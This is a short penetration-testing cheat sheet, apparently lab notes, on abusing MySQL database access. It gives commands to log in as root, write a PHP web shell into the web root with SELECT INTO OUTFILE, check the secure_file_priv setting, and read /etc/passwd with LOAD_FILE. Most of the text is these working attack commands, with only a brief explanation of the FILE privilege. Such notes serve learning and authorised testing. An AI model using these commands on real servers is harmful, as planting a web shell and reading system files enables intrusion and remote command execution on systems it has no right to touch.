## Connecting to the db

```sh
mysql 10.10.15.12 -u root -p
```

## MySQL - Write Local File

```sh
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```


- In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

#### MySQL - Secure File Privileges


```sh
show variables like "secure_file_priv";
```

## Read Local Files in MySQL

```sql
select LOAD_FILE("/etc/passwd");
```

